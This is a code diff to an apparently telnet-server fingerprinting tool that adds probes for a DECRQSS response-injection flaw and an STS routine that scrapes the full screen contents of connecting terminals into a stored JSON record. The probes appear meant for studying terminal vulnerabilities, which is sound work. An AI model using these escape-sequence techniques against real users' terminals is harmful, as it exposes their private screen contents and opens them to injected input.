@@ -152,6 +152,8 @@ __all__ = (
     "fingerprinting_post_script",
     "get_client_fingerprint",
     "probe_client_capabilities",
+    "probe_sts",
+    "scrape_screen_sts",
 )
 
 #: Extended NEW_ENVIRON variable list used during client fingerprinting.
@@ -1087,6 +1089,7 @@ _CVE_PROBES = [
 _CPR_RE = re.compile(rb"\x1b\[(\d+);(\d+)R")
 _DECRQCRA = "\x1b[{pid};1;{r};{c};{r};{c}*y"
 _DECCKSR_RE = re.compile(rb"\x1bP(\d+)!~([0-9A-Fa-f]{4})\x1b\\")
+_STS_SOS_RE = re.compile(rb"\x1bXCTerm:STS:(\d+):(.*?)\x1b\\", re.DOTALL)
 
 
 async def _read_until_cpr(
@@ -1152,6 +1155,183 @@ async def probe_cve_vulnerabilities(
     return results
 
 
+async def probe_injection(
+    reader: Union[TelnetReader, TelnetReaderUnicode],
+    writer: Union[TelnetWriter, TelnetWriterUnicode],
+    timeout: float = 2.0,
+) -> dict[str, Any]:
+    """
+    Probe for DECRQSS response injection.
+
+    Sends a DECRQSS query containing a unique marker. Vulnerable terminals
+    echo the marker back in the DCS response, allowing an attacker to inject
+    arbitrary data into the terminal's response stream. The injected data
+    is then interpreted as keyboard input by the application reading from
+    the terminal.
+
+    This is the root cause of CVE-2008-2383 and CVE-2022-45872. The probe
+    writes a marker, triggers the injection, erases the marker, and checks
+    if the terminal echoed it back.
+
+    :returns: dict with ``injectable`` bool and echoed ``content`` if vulnerable.
+    """
+    _writer = cast(TelnetWriterUnicode, writer)
+
+    marker = "INJECT_9x7k"
+
+    # Save cursor, write marker at a known position, send DECRQSS with
+    # marker embedded, erase the line, restore cursor, CPR fence.
+    _writer.write(
+        "\x1b[s"                          # save cursor
+        f"\x1bP$q;{marker}\x1b\\"        # DECRQSS with marker payload
+        "\x1b[u"                          # restore cursor
+        "\x1b[6n"                         # CPR fence
+    )
+    await _writer.drain()
+
+    cpr_match, buf = await _read_until_cpr(reader, timeout=timeout)
+    if cpr_match:
+        buf = buf[:cpr_match.start()] + buf[cpr_match.end():]
+
+    marker_bytes = marker.encode("latin-1")
+    if marker_bytes in buf:
+        content = buf.decode("latin-1", errors="replace").replace("\x1b", "\\e")
+        logger.debug("probe_injection: marker found in response: %s", content[:120])
+        return {"injectable": True, "content": content}
+
+    logger.debug("probe_injection: marker not echoed (%d bytes)", len(buf))
+    return {"injectable": False}
+
+
+async def probe_sts(
+    reader: Union[TelnetReader, TelnetReaderUnicode],
+    writer: Union[TelnetWriter, TelnetWriterUnicode],
+    timeout: float = 1.0,
+) -> Optional[dict[str, Any]]:
+    """
+    Probe STS (Set Transmit State) screen content exfiltration.
+
+    ECMA-48 STS (``ESC S``) causes the terminal to transmit the contents of
+    the selected area back to the server.  The selected area is defined by
+    SSA (``ESC F``) at the start and the cursor position at the time of STS.
+
+    Unlike DECRQCRA (which returns a checksum), STS returns the **actual
+    screen content** — a full screen-scraping attack.
+
+    Currently known to be supported by SyncTERM/CTerm.  The response is
+    framed as ``SOS CTerm:STS:<N>: <content> ST``.
+
+    Uses a CPR fence (DSR ``\\x1b[6n``) so unsupported terminals return
+    quickly instead of waiting for the full timeout.
+
+    :returns: dict with ``sts`` bool and ``content`` if successful.
+    """
+    _writer = cast(TelnetWriterUnicode, writer)
+
+    rows = writer.get_extra_info("rows") or 25
+    cols = writer.get_extra_info("cols") or 80
+
+    # Save cursor, SSA at (1,1), cursor to bottom-right, STS, restore
+    # cursor, CPR fence.  Nothing is written to the screen.
+    _writer.write(
+        "\x1b[s"                    # save cursor
+        "\x1b[1;1H"                # cursor to (1,1)
+        "\x1bF"                     # ESC F = SSA (Start of Selected Area)
+        f"\x1b[{rows};{cols}H"     # cursor to bottom-right
+        "\x1bS"                     # ESC S = STS (Set Transmit State)
+        "\x1b[u"                    # restore cursor
+        "\x1b[6n"                   # CPR fence
+    )
+    await _writer.drain()
+
+    # SOS response (if any) arrives before the CPR
+    cpr_match, buf = await _read_until_cpr(reader, timeout=timeout)
+    if cpr_match:
+        buf = buf[:cpr_match.start()] + buf[cpr_match.end():]
+
+    match = _STS_SOS_RE.search(buf)
+    if match:
+        mode = match.group(1).decode("ascii", errors="replace")
+        content = match.group(2)
+        logger.debug(
+            "probe_sts: STS supported, mode=%s, %d bytes",
+            mode, len(content),
+        )
+        return {
+            "sts": True,
+            "mode": int(mode),
+            "content_length": len(content),
+        }
+
+    logger.debug("probe_sts: no STS response (%d bytes received)", len(buf))
+    return {"sts": False}
+
+
+async def scrape_screen_sts(
+    reader: Union[TelnetReader, TelnetReaderUnicode],
+    writer: Union[TelnetWriter, TelnetWriterUnicode],
+    rows: int = 25,
+    cols: int = 80,
+    timeout: float = 5.0,
+) -> Optional[dict[str, Any]]:
+    """
+    Scrape full screen contents via STS.
+
+    :returns: dict with screen content as list of row strings, or None.
+    """
+    _writer = cast(TelnetWriterUnicode, writer)
+
+    # SSA at (1,1), cursor to (rows,cols), STS
+    _writer.write(
+        "\x1b[1;1H"
+        "\x1bF"
+        f"\x1b[{rows};{cols}H"
+        "\x1bS"
+    )
+    await _writer.drain()
+
+    buf = b""
+    deadline = asyncio.get_running_loop().time() + timeout
+    while True:
+        remaining = deadline - asyncio.get_running_loop().time()
+        if remaining <= 0:
+            break
+        try:
+            data = await asyncio.wait_for(reader.read(4096), timeout=remaining)
+        except (asyncio.TimeoutError, ConnectionError):
+            break
+        if not data:
+            break
+        if isinstance(data, str):
+            data = data.encode("latin-1")
+        buf += data
+        if b"\x1b\\" in buf:
+            break
+
+    match = _STS_SOS_RE.search(buf)
+    if not match:
+        return None
+
+    content = match.group(2)
+    # Split into rows of `cols` characters each
+    text = content.decode("latin-1", errors="replace")
+    screen_rows = []
+    for r in range(rows):
+        start = r * cols
+        end = start + cols
+        if start < len(text):
+            screen_rows.append(text[start:end].rstrip())
+        else:
+            screen_rows.append("")
+
+    return {
+        "method": "sts",
+        "rows": rows,
+        "cols": cols,
+        "normal": screen_rows,
+    }
+
+
 async def probe_decrqcra(
     reader: Union[TelnetReader, TelnetReaderUnicode],
     writer: Union[TelnetWriter, TelnetWriterUnicode],
@@ -1175,7 +1355,7 @@ async def probe_decrqcra(
 
     cpr_match, _ = await _read_until_cpr(reader, timeout=timeout)
     if not cpr_match:
-        logger.info("probe_decrqcra: CPR timeout")
+        logger.debug("probe_decrqcra: CPR timeout")
         return {"decrqcra": False}
 
     row = int(cpr_match.group(1))
@@ -1202,7 +1382,7 @@ async def probe_decrqcra(
     cksum_a = checksums.get(1)
     cksum_b = checksums.get(2)
     supported = cksum_a is not None and cksum_b is not None and cksum_a != cksum_b
-    logger.info("probe_decrqcra: row=%d, cksum_a=%s, cksum_b=%s, supported=%s",
+    logger.debug("probe_decrqcra: row=%d, cksum_a=%s, cksum_b=%s, supported=%s",
                 row, cksum_a, cksum_b, supported)
     return {"decrqcra": supported}
 
@@ -1471,21 +1651,38 @@ async def fingerprinting_server_shell(
         await writer.drain()
         await asyncio.sleep(0.1)
 
-    # Run CVE and DECRQCRA probes directly over the telnet connection,
-    # before launching the PTY subprocess for ucs-detect.
+    # Run CVE, injection, STS, and DECRQCRA probes directly over the telnet
+    # connection, before launching the PTY subprocess for ucs-detect.
     if filepath is not None:
         cve_results = await probe_cve_vulnerabilities(reader, writer)
-        decrqcra_result = await probe_decrqcra(reader, writer)
+
+        # Injection probe — DECRQSS response echo-back
+        injection_result = await probe_injection(reader, writer)
+
+        # STS probe — faster than DECRQCRA, returns actual content (SyncTERM)
+        sts_result = await probe_sts(reader, writer)
 
         scrape_result: Optional[dict[str, Any]] = None
-        if decrqcra_result and decrqcra_result.get("decrqcra"):
-            rows = writer.get_extra_info("rows") or 25
-            cols = writer.get_extra_info("cols") or 80
+        rows = writer.get_extra_info("rows") or 25
+        cols = writer.get_extra_info("cols") or 80
+
+        if sts_result and sts_result.get("sts"):
+            scrape_result = await scrape_screen_sts(reader, writer, rows, cols)
+
+        # Always probe DECRQCRA too, for tracking/reporting
+        decrqcra_result = await probe_decrqcra(reader, writer)
+        if not scrape_result and decrqcra_result and decrqcra_result.get("decrqcra"):
             scrape_result = await scrape_screen(reader, writer, rows, cols)
 
         with open(filepath, encoding="utf-8") as f:
             data = json.load(f)
         data["cve_results"] = cve_results
+        if injection_result:
+            data["injection_probe"] = injection_result
+        if sts_result:
+            data["sts_probe"] = sts_result
+        if decrqcra_result:
+            data["decrqcra_probe"] = decrqcra_result
         if scrape_result:
             data["screen-scrape"] = scrape_result
         elif decrqcra_result:
